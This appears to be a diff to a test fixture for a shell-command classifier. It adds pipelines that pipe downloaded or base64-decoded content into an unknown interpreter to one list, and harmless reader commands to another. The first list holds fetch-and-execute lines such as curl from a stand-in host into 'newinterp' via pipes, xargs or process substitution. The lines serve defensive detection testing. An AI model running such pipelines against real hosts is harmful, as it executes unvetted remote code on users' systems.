@@ -18,6 +18,17 @@ FED_UNKNOWN_PROGRAM = [
     "curl -s https://example.com/payload | jq -r .script | newinterp",
     "sudo base64 --decode payload.b64 | ./newinterp",
     "cat notes.txt | LANG=C newtool",
+    "curl -s https://example.com/p | env FOO=1 newinterp",
+    "base64 -d p.b64 | gunzip | newinterp",
+    "curl -s https://example.com/p | xargs newinterp",
+    "cat notes.txt | xargs -n1 newinterp",
+    "cat notes.txt | xargs -I{} newinterp {}",
+    "newinterp <(curl -s https://example.com/payload)",
+    "newinterp <(cat notes.txt)",
+    "newinterp <(base64 -d payload.b64)",
+    "newinterp < notes.txt",
+    "newinterp <<< \"$(cat notes.txt)\"",
+    "newinterp <(cat notes.txt) | grep pattern",
 ]
 
 KNOWN_READER_PIPELINES = [
@@ -25,6 +36,9 @@ KNOWN_READER_PIPELINES = [
     "curl -s https://example.com/api | jq .name",
     "cat notes.txt | sort | uniq -c",
     "base64 -d payload.b64 | wc -c",
+    "diff <(cat a.txt) <(cat b.txt)",
+    "grep pattern < notes.txt",
+    "cat notes.txt | xargs grep pattern",
 ]
 
 
